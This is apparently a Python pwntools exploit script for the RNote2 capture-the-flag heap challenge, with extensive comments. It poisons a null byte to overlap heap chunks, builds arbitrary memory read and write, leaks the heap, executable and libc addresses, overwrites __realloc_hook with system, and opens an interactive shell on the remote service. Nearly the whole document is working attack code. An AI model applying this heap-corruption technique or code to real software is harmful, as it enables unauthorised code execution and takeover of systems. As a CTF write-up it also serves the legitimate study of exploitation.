#!/usr/bin/env python2

from pwn import *

#t = process(['./RNote2'])
t = remote('rnote2.2017.teamrois.cn',  6666)

# Rnote2 is an interactive notebook.

# The menu looks like this
#
# 1.Add new note
# 2.Delete a note
# 3.List all note
# 4.Edit a note
# 5.Expand a note
# 6.Exit
#
#
# The notes are allocated on the heap and placed inside a double linked list.
#
# Notes have the following structure:
# struct note {
#	qword edited // 1 if the note has been edited otherwise 0
#	qword length
#	qword next
#	qword prev
#	qword cont_buffer_p // points to string with the actual content
# }
#
# When we create a note the programm asks for the length <l> of the content
# and then reads at most <l> bytes, but stops reading if it encounters
# a newline. If exactly <l> bytes are read the content is _not_ Null terminated.
#
# When expanding the note, the programm asks by how many bytes the note
# should be expandet.
# Then it reads the additional content into a stack_buffer,
# reallocates the note->content_buffer with the new lenght.
# and then calls
# strncat(note->content_buffer, <stack_buffer>, <n_additional_bytes> - 1)
# This call can overflow the buffer, because note->content_buffer may not be
# Null terminated

# The menu looks like this
#
# 1.Add new note
# 2.Delete a note
# 3.List all note
# 4.Edit a note
# 5.Expand a note
# 6.Exit
#

def prepare_heap():
	'''
	Uses  Null byte posioning to
	to create a free chunk that overlaps with
	a note struct.

	Follows this example:
	https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c

	Note: This is more complicated than is has to be.
	I've created this mostrly by trial-and-error and included some steps
	that could have been avoided, but changing anything
	will change heap offsets and break the exploit.
	'''

	# Create Note_A
	pld  = '1\n'.ljust(16, '\x00')
	pld += '208\n'.ljust(16, '\x00')
	pld += 'A' * 208

	# Create Note_B
	pld += '1\n'.ljust(16, '\x00')
	pld += '208\n'.ljust(16, '\x00')
	pld += 'B' * 208

	# The heap looks like this now
	# | Note_A | <cs> | Note_A.content       | <cs> | Note_B | <cs> | Note_B.content       | <cs> |( wilderness)
	# <cs> = chunk size
	#
	# Note_A.content is padded with 8 Null bytes, effectivly zero terminating
	# the string. The next steps change the value of the padding.
	#
	# This could have been avoided if Note_A.content was 8 bytes larger

	# Delete Note_A
	pld += '2\n'.ljust(16, '\x00')
	pld += '1\n'.ljust(16, '\x00')

	# The heap looks like this now
	# | [Free]| <cs> | [Free] | <pcs> | <cs> | Note_B | <cs> | Note_B.content       | <cs> |( wilderness)
	# <pcs> = previous chunk size != 0

	# Create Note_C
	pld += '1\n'.ljust(16, '\x00')
	pld += '208\n'.ljust(16, '\x00')
	pld += 'C' * 208

	# The heap looks like this now
	# | Note_C | <cs> | Note_C.content + <fpcs> | <cs> | Note_B | <cs> | Note_B.content       | <cs> |( wilderness)
	# <fpcs> = former previous chunk size != 0
	# Note_C.content is not Null terminated because the lowest byte
	# of <fpcs> is != 0
	#
	# The next steps create, extend and delete some notes to ensure that
	# things end up where we want them

	# Create Note_D
	pld += '1\n'.ljust(16, '\x00')
	pld += '168\n'.ljust(16, '\x00')
	pld += 'D' * 168

	# The heap looks like this now
	#              | Note_C | <cs> | Note_C.content + <fpcs>| <cs> | Note_B | <cs> | Note_B.content
	#       | <cs> | Note_D | <cs> | Note_D.content         | <cs> | ( wilderness)

	# Create Note_E
	pld += '1\n'.ljust(16, '\x00')
	pld += '232\n'.ljust(16, '\x00')
	pld += 'I' * 232

	# The heap looks like this now
	#              | Note_C | <cs> | Note_C.content + <fpcs>| <cs> | Note_B | <cs> | Note_B.content
	#       | <cs> | Note_D | <cs> | Note_D.content         | <cs> | Note_E | <cs> | Note_E.content
	#       | <cs> | (wilderness)

	# Expand Note_D
	pld += '5n'.ljust(16, '\x00')
	pld += '3\n'.ljust(16, '\x00')
	pld += '88\n'.ljust(16, '\x00')
	pld += 'G' * 88


	# The heap looks like this now
	#              | Note_C | <cs> | Note_C.content + <fpcs>| <cs> | Note_B | <cs> | Note_B.content
	#       | <cs> | Note_D | <cs> | [Free]         | <pcs> | <cs> | Note_E | <cs> | Note_E.content
	#       | <cs> | Note_D.contents                        | <cs> | (wilderness)

	#Create Note_F
	#c
	pld += '1\n'.ljust(16, '\x00')
	pld += '256\n'.ljust(16, '\x00')
	pld += 'X' * 256

	# The heap looks like this now
	#              | Note_C | <cs> | Note_C.content + <fpcs>| <cs> | Note_B | <cs> | Note_B.content
	#       | <cs> | Note_D | <cs> | Note_F         | <pcs> | <cs> | Note_E | <cs> | Note_E.content
	#       | <cs> | Note_D.contents                        | <cs> | Note_F.content
	#       | <cs> | (wilderness)


	# Delete Note_E
	pld += '2\n'.ljust(16, '\x00')
	pld += '4\n'.ljust(16, '\x00')

	# The heap looks like this now
	#                | Note_C | <cs> | Note_C.content + <fpcs>| <cs> | Note_B         | <cs> | Note_B.content
	#         | <cs> | Note_D | <cs> | Note_F         | <pcs> | <cs> | [Free] | <pcs> | <cs> | [Free]
	# | <pcs> | <cs> | Note_D.contents                | <pcs> | <cs> | Note_F.content
	#         | <cs> | (wilderness)

	# delete Note_D
	pld += '2\n'.ljust(16, '\x00')
	pld += '3\n'.ljust(16, '\x00')

	# The heap looks like this now
	#                | Note_C        | <cs> | Note_C.content + <fpcs>| <cs> | Note_B         | <cs> | Note_B.content
	#         | <cs> | [Free] | <pcs | <cs> | Note_F         | <pcs> | <cs> | [Free] | <pcs> | <cs> | [Free]
	# | <pcs> | <cs> | [Free]                                | <pcs> | <cs> | Note_F.content
	#         | <cs> | (wilderness)

	# Expand Note_C
	pld += '5\n'.ljust(16, '\x00')
	pld += '2\n'.ljust(16, '\x00')
	pld += '24\n'.ljust(16, '\x00')
	pld += 'D' * 24

	# The heap looks like this now
	#                 | Note_C        | <cs> | [Free]         | <pcs> | <cs> | Note_B         | <cs> | Note_B.content
	#         | <cs>  | [Free] | <pcs | <cs> | Note_F         | <pcs> | <cs> | [Free] | <pcs> | <cs> | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | [Free]                                | <pcs> | <cs> | Note_F.content
	#         | <cs>  | (wilderness)
	#
	# This is where the heap corruption happened:
	# because Note_C.content was not Null Terminated the least significat byte*
	# of <fpcs> stays in Note_C.content and the buffer is overflowed by 1 byte
	# the byte that overflows is the Null Terminater.
	#
	# This overrides the least significat byte of the chunk size of the next
	# free chunk with 0x00
	#
	# *only the least significatn byte is != 0
	#
	# <ccs> = corrupted chunk size. Used to be 0x110 but is  0x100



	#b1.
	# Create Note_G
	pld += '1\n'.ljust(16, '\x00')
	pld += '128\n'.ljust(16, '\x00')
	pld += 'Y' * 128

	# The heap looks like this now
	#                 | Note_C        | <cs> | Note_G.content         | <cs> | Note_B         | <cs> | Note_B.content
	#         | <cs>  | [Free] | <pcs | <cs> | Note_F         | <pcs> | <cs> | Note_G         | <cs> | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | [Free]                                | <pcs> | <cs> | Note_F.content
	#         | <cs>  | (wilderness)

	#b1
	# Create Note_H
	pld += '1\n'.ljust(16, '\x00')
	pld += '128\n'.ljust(16, '\x00')
	pld += 'K' * 128

	# The heap looks like this now
	#                 | Note_C        | <cs> | Note_G.content         | <cs> | Note_B | <cs> | Note_B.content
	#         | <cs>  | Note_H        | <cs> | Note_F         | <pcs> | <cs> | Note_G | <cs> | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | Note_H.content       | [Free]         | <opcs>| <cs  | Note_F.content
	#         | <cs>  | (wilderness)
	#
	# <mpcs> = misplaced previous chunk size
	# <opcs> = outdated previous chunks size
	#
	# When Note_H.content is allocated the chunk that it gets placed in is
	# split. The <pcs> before Note_F should be updated with the size of the
	# remaining free chunk, but beacause <ccs> is 0x100 instead of 0x110
	# the new value gets written in the wrong place and <opcs> remains
	# unchanged.


	#b2
	# Create Note_I
	pld += '1\n'.ljust(16, '\x00')
	pld += '256\n'.ljust(16, '\x00')
	pld += 'Z' * 256
	# The heap looks like this now
	#                 | Note_C                | <cs> | Note_G.content                   | <cs> | Note_B  | <cs> | Note_B.content
	#         | <cs>  | Note_H                | <cs> | Note_F                   | <pcs> | <cs> | Note_G  | <cs> | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | Note_H.content        | <cs> | Note_I | <cs> | [Free_A] | <opcs>| <cs> | Note_F.content
	#         | <cs>  | Note_I.content        | <cs> |(wilderness)


	# Delete Note_H
	pld += '2\n'.ljust(16, '\x00')
	pld += '5\n'.ljust(16, '\x00')

	# The heap looks like this now
	#                 | Note_C                 | <cs> | Note_G.content                   | <cs> | Note_B | <cs> | Note_B.content
	#         | <cs>  | [Free]         | <pcs> | <cs> | Note_F                   | <pcs> | <cs> | Note_G | <cs> | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | [Free_B]       | <pcs> | <cs> | Note_I | <cs> | [Free_A] | <opcs>| <cs> | Note_F.content
	#         | <cs>  | Note_I.content         | <cs> |(wilderness)


	# Delete Note_F
	pld += '2\n'.ljust(16, '\x00')
	pld += '3\n'.ljust(16, '\x00')


	# The heap _should_ look like this now
	#                 | Note_C                 | <cs> | Note_G.content                   | <cs> | Note_B           | <cs>  | Note_B.content
	#         | <cs>  | [Free]         | <pcs> | <cs> | Note_F                   | <pcs> | <cs> | Note_G           | <cs>  | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | [Free_B]       | <pcs> | <cs> | Note_I | <cs> | [Free_A] consolidated with [Free_F]
	# | <pcs> | <cs>  | Note_I.content         | <cs> | (wilderness)
	#
	# but beacause <opc> is outdated [Free_F] gets consolidated with [Free_B] instead of [FREE_A]
	# and the heap looks like this
	#
	# The heap _should_ look like this now
	#                 | Note_C                 | <cs> | Note_G.content                   | <cs> | Note_B           | <cs>  | Note_B.content
	#         | <cs>  | [Free]         | <pcs> | <cs> | Note_F                   | <pcs> | <cs> | Note_G           | <cs>  | Note_C.content + <fpcs> + 'D' * 24
	#         | <ccs> | [Free_B] consolidated with [Free_F] but also Note_I
	# | <pcs> | <cs>  | Note_I.content         | <cs> | (wilderness)

	# Now we have a free chunk that overlaps with Note_I.
	# We can allocate a new note in this chunk and overwrite
	# Note_I

	pld += '3\n'.ljust(16, '\x00')

	t.send(pld)

	t.recvuntil('ZZZZZZZZZZZZZZZZZZZZZZZZ')
	t.recvuntil('choice:\n')



def read_heap_base():
	'''
	Leaks a pointer from the heap and calculates the base address of the heap
	'''
	# Create a new Note. Its contents will be allocated in the chunk
	# overlapping with Note_I.
	# We can change Note_I to:
	#
	# struct note {
	# 	edited = 0x0101010101010101 # prevent printf from stopping on 0 byte
	# 	length = 0x0101010101010101 # prevent printf from stopping on 0 byte
	# 	next = 0
	# 	prev = 0
	# 	content_buffer_p = 0
	#}
	#
	# Note_I.next will be overriten with a pointer to the new note

	pld = '1\n'.ljust(16, '\x00')
	pld += '256\n'.ljust(16, '\x00')


	pld += ('A' * 144 + p64(0x0101010101010101) + p64(0x0101010101010101) + p64(0) + p64(0) + p64(0)).ljust(256, 'H')

	pld += '3\n'.ljust(16, '\x00')

	# List all Notes
	# When the content of the new note is printed it will contain
	# Note_I.next
	# we can use that pointer to calculate the heap base

	# Delete the new Note
	pld += '2\n'.ljust(16, '\x00')
	pld += '5\n'.ljust(16, '\x00')

	t.send(pld)

	t.recvuntil('choice:\n')
	s = t.recvuntil('choice:\n')
	os = s.rsplit(p64(0x0101010101010101))[-1].split('\n')[0]
	o = u64(os.ljust(8, '\x00'))
	t.recvuntil('choice:\n')

	return o - 0x260

def read_mem(ptr):
	'''
	Read a string from arbitrary memory
	'''
	# Create a new Note. Its contents will be allocated in the chunk
	# overlapping with Note_I.
	# We can change Note_I to:
	#
	# struct note {
	# 	edited = 0
	# 	length = 0
	# 	next = 0
	# 	prev = 0
	# 	content_buffer_p = ptr
	#}
	#
	pld = '1\n'.ljust(16, '\x00')
	pld += '256\n'.ljust(16, '\x00')
	pld += ('A' * 144 + p64(0) + p64(0) + p64(0) + p64(0) + p64(ptr)).ljust(256, 'H')

	# List all Notes
	# When the content of Note_I is printed the string at [ptr] is printed
	# instead

	pld += '3\n'.ljust(16, '\x00')

	# Delete the new Note
	pld += '2\n'.ljust(16, '\x00')
	pld += '5\n'.ljust(16, '\x00')

	t.send(pld)

	t.recvuntil('choice:\n')
	s = t.recvuntil('choice:\n')
	vs = s.split('content:')[4].split('\n')[0].strip()
	v = u64(vs.ljust(8, '\x00'))
	t.recvuntil('choice:\n')

	return v

def write_mem(ptr, val, cleanup=True):
	'''
	Write arbitrary memory
	'''
	# Create a new Note. Its contents will be allocated in the chunk
	# overlapping with Note_I.
	# We can change Note_I to:
	#
	# struct note {
	# 	edited = 0
	# 	length = 0
	# 	next = 0
	# 	prev = 0
	# 	content_buffer_p = ptr
	#}
	#
	# we also use this as a chance to place the string "/bin/sh" into memory
	pld = '1\n'.ljust(16, '\x00')
	pld += '256\n'.ljust(16, '\x00')
	pld += ('/bin/sh\x00' + 'A' * 136 + p64(0) + p64(0x8) + p64(0) + p64(0) + p64(ptr)).ljust(256, 'H')

	# Edit Note_I
	# The new content is written at [ptr]
	pld += '4\n'.ljust(16, '\x00')
	pld += '4\n'.ljust(16, '\x00')

	pld += p64(val)

	if cleanup:
		# Delete the new Note
		pld += '2\n'.ljust(16, '\x00')
		pld += '5\n'.ljust(16, '\x00')

	t.send(pld)

	t.recvuntil('choice:\n')
	t.recvuntil('choice:\n')
	if cleanup:
		t.recvuntil('choice:\n')


def trigger_realloc(n):
	'''
	Resize note n to trigger reallocation of its content
	'''
	pld  = '5\n'.ljust(16, '\x00')
	pld += str(n).ljust(16, '\x00')
	pld += '0\n'.ljust(16, '\x00')
	t.send(pld)
	t.recvuntil('How long do you want to expand?')


prepare_heap()

heap_base = read_heap_base()
log.info('heap base: ' + hex(heap_base))

# Because the executable is position independend (PIE) we have to
# leak a pointer into the data section and calculate the base address
# of the executable
exec_base = read_mem(heap_base + 0x138) - 0x202080
log.info('exec base: ' + hex(exec_base))

# leak the GOT entry for atoi
# this allows us to calculate the base address of libc
atoi_got = exec_base + 0x00201fe0
atoi = read_mem(atoi_got)

log.info('atoi: ' + hex(atoi))
log.info('atoi@got: ' + hex(atoi_got))

libc_base = atoi - 0x00036e80
log.info('libc base: ' + hex(libc_base))

realloc_hook = libc_base + 0x003c3b08
log.info('realloc_hook: ' + hex(realloc_hook))

system = libc_base + 0x00045390
log.info('system: ' + hex(system))

# override __realloc_hook with system
# the next time a note is extendet, system will be called with it contents
# as the first argument
write_mem(realloc_hook, system, cleanup=False)

# Resize the note that was created during the write.
# this will call system("/bin/sh"), because write_mem placed "/bin/sh\x00"
# into the contents
trigger_realloc(5)

# We shoud have a shell :D
t.interactive()
